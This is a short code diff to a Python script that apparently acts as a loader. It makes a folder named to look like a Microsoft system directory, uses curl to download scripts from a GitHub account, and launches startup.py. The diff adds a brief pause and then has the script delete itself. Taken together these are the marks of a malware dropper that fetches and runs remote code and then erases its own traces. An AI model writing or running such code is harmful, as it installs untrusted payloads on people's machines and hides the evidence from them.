@@ -1,4 +1,5 @@
 import os
+import time
 
 directory = "C:/ProgramData/Microsoft Storage"
 os.makedirs(directory, exist_ok=True)
@@ -10,3 +11,5 @@ os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/m
 os.system("curl -O https://raw.githubusercontent.com/Fghthssss/BUSB/refs/heads/main/startup.py")
 
 os.system("start startup.py")
+time.sleep(1)
+os.remove("loader.py")
